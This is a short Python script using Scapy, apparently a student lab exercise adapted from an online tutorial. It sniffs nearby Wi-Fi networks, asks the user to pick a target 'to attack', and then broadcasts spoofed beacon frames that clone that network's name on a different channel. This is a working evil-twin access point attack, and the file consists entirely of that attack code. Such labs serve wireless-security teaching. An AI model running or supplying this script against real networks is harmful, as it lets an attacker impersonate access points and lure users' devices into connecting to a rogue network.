#!/usr/bin/env python3
# Julien Huguet & Antoine Hunkeler
# Source : https://www.thepythoncode.com/article/create-fake-access-points-scapy

from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap
from scapy.sendrecv import sniff



interface = "wlan0mon"
ssid_list = []
ssid_channel_list = {}


def getProbReqSTA(packet):
	if Dot11ProbeResp in packet and Dot11Elt in packet[Dot11ProbeResp]  and packet.info not in ssid_list:
		channel = int(ord(packet[Dot11Elt:3].info))
		ssid = packet.info
		intensity = packet.dBm_AntSignal
		ssid_list.append(ssid)
		ssid_channel_list[ssid] = int(channel)
		print("| Num Target : %d | SSID : %s | Channel : %s | Intensity : %d |" % (len(ssid_list), ssid.decode("utf-8"), str(channel), intensity))

	
#Sniff the different AP and print for user
sniff(iface=interface, prn=getProbReqSTA)

#Ask user the target to attack
userInput = int(input("Please select the num target : "))

#Select the ap to attack
ssidToAttack = ssid_list[userInput - 1]
ssidChannel = ssid_channel_list[ssidToAttack]

#Create the fake channel
if ssidChannel > 6:
	fakeChannel = ssidChannel - 6
else:
	fakeChannel = ssidChannel + 6

# generate a random MAC address (built-in in scapy)
sender_mac = RandMAC()
# 802.11 frame
dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
# beacon layer
beacon = Dot11Beacon()
# putting ssid in the frame
essid = Dot11Elt(ID="SSID", info=ssidToAttack, len=len(ssidToAttack))
# adding channel
echannel = Dot11Elt(ID="DSset", info=chr(fakeChannel))
# stack all the layers and add a RadioTap
frame = RadioTap()/dot11/beacon/essid/echannel
# send the frame in layer 2 every 100 milliseconds forever
# using the `iface` interface
sendp(frame, inter=0.1, iface=interface, loop=1)